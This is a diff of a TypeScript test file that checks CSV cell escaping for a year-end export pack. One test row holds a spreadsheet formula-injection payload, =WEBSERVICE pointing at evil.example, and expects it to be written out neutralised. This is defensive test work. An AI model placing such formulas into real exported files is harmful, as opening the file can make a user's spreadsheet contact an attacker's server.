@@ -1,6 +1,6 @@
 import { describe, expect, it, vi } from "vitest";
 import { csvCell, neutraliseFormula } from "@/lib/csv/write";
-import { toCsv } from "@/lib/reports/accountant-pack";
+import { toCsv } from "@/lib/year-end/pack";
 
 vi.mock("server-only", () => ({}));
 
@@ -28,8 +28,11 @@ describe("csvCell", () => {
     expect(csvCell("one\r\ntwo")).toBe('"one\r\ntwo"');
   });
 
-  it("is what the accountant pack writes", () => {
-    const csv = toCsv(["payee", "amount"], [["=WEBSERVICE(\"https://evil.example\")", "-40.00"]]);
+  it("is what the year-end pack writes", () => {
+    const csv = toCsv([
+      ["payee", "amount"],
+      ["=WEBSERVICE(\"https://evil.example\")", "-40.00"],
+    ]);
     expect(csv.split("\n")[1]).toBe("\"'=WEBSERVICE(\"\"https://evil.example\"\")\",-40.00");
   });
 
